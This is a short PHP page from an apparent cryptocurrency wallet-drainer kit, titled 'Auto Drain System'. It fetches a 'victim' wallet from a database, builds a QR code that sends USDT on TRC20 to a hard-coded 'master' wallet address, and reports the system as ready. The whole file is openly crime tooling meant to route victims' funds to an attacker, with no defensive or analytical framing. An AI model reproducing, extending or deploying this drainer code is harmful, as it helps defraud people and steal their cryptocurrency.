<?php
require_once 'config.php';

// Database connection
$pdo = getDB();
if (!$pdo) {
    die("❌ Database connection failed!");
}

// Get victim wallet
$stmt = $pdo->prepare("SELECT wallet_address FROM wallets WHERE is_active = 1 LIMIT 1");
$stmt->execute();
$victim = $stmt->fetch();

if (!$victim) {
    die("❌ No active victim wallet found!");
}

$VICTIM_WALLET = $victim['wallet_address'];
$MASTER_WALLET = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";

// QR generate
$qr_data = "tron://transfer?address=" . $MASTER_WALLET . "&contract=" . USDT_CONTRACT . "&network=TRC20";
$qr_url = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($qr_data);

echo "<h1>💀 Auto Drain System</h1>";
echo "<img src='$qr_url' width='250'><br>";
echo "<p><strong>Victim:</strong> " . substr($VICTIM_WALLET, 0, 15) . "...</p>";
echo "<p><strong>Master:</strong> " . $MASTER_WALLET . "</p>";
echo "<p style='color:green;'>✅ System is ready!</p>";
echo "<p><a href='index.php'>🏠 Back to Home</a></p>";
?>
